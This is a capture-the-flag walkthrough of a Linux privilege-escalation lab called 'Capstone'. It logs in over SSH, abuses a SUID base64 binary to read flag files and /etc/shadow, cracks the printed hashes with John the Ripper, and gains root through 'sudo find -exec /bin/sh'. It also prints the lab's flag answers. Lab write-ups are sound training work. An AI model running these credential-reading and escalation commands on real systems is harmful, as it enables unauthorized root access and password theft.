# Capstone Challenge

**Credits:**

**Rejaul Islam**  
_Security enthusiast_

............................................

After completing the Linux privilege escalation module, you get a challenge named “Capstone.” In this challenge, we have an IP address, username:password, and a hint to log in with SSH. Then, you try to get root access and read the flag.

So let’s get started with Rejaul.

Credentials:
Username: leonard
Password: Penny123
[<ip> from THM]

Step 1: Let's log in first with those credentials using SSH.

```
ssh leonard@10.201.25.99
# password: Penny123
```

Now you should find a shell in your terminal.

```
[leonard@ip-<THM_ip> ~]$
```

Then I try to see the file and folder with “ls,” but unfortunately, this “perl5” folder is empty, or maybe we don’t have access to see inside this folder.

Then I try to see sudo persimmon for Leonard users with -

```
sudo -l
```

Res:

We trust you have received the usual lecture from the local system.
Administrator. It usually boils down to these three things:

#1) Respect the privacy of others.
#2) Think before you type.
#3) With great power comes great responsibility.

Oops! Sudo permission denied.

Then I decided to check the permissions for this user, and I ran this command to check:

```
find / -perm -4000 2>/dev/null
```

Result (sample from the box):

```
/usr/bin/passwd
```

I found lots of permissions, but in the previous task we read the flag with base64, right? Let’s try this:

Then I went to the /home directory and found three folders. One is for the current user, leonard, and the other two folders are interesting. They give us some hints for finding the flag, right? We know that we need to find two flags: “flag1.txt” and “flag2.txt.” With those folders, we can think that flag2.txt is in the root folder; this is standard and normally happens.

Then I try to see the content under missy and rootflag, but I don’t have permission.

Let's try to find the flag with base64.

```
/usr/bin/base64 /home/missy/flag1.txt | /usr/bin/base64 -d
```

Result:

```
/usr/bin/base64: /home/missy/flag1.txt: No such file or directory
```

Try rootflag:

```
/usr/bin/base64 /home/rootflag/flag2.txt | /usr/bin/base64 -d
```

Result:

```
THM-168824782390238
```

WAHH! It's a miracle that, without getting root access, we can read flag2.txt, but we still can’t read flag1.txt, right?

Let’s try to see the /etc/shadow file to find Missy’s user password.

```
cat /etc/shadow
```

Result:

```
Permission denied
```

Let’s try using base64 to read this file –

```
/usr/bin/base64 /etc/shadow | /usr/bin/base64 -d
```

Result:

```
root:$6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmaDD9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51::0:99999:7:::
missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::
```

We found that one password is the root user’s and one is Missy’s. Let’s crack them with John the Ripper.
Save this to your local machine as “pass.txt” and then run these tools:

```
john pass.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

After some time, you should find Missy's user password.

```
Password1        (missy)
```

Now change the user Leonard to Missy.

```
su Missy
# password: Password1
```

Now try to visit the /home/missy folder, then try to find the flag.

```
find / -type f -name flag1.txt 2>/dev/null
```

Result:

```
/home/missy/Documents/flag1.txt
```

I found the flag1.txt path; now try to read it.

```
cat /home/missy/Documents/flag1.txt
```

Result:

```
THM-42828719920544
```

Yeah, I also found flag1. But I still can't get access to the rootflag folder. I need to get root access to visit this folder. I got 2 flags, this is not the right way to get the root flag. So i decided to get the root access now -

Now i try to see the sudo permission for missy user -

```
sudo -l
```

Unfortunately I found a valuable response -

```
(ALL) NOPASSWD: /usr/bin/find
```

Then I am not trying to see others way like (path, SUID, capabilities)

With find i search into gtfobins.github.io to find the exploit -

```
sudo find . -exec /bin/sh \; -quit
```

Then:

```
cd rootflag
cat flag2.txt
```

Result:

```
THM-168824782390238
```

Again we got the flag and finally we completed the normal user to root user accessing process.

--- THE END ---
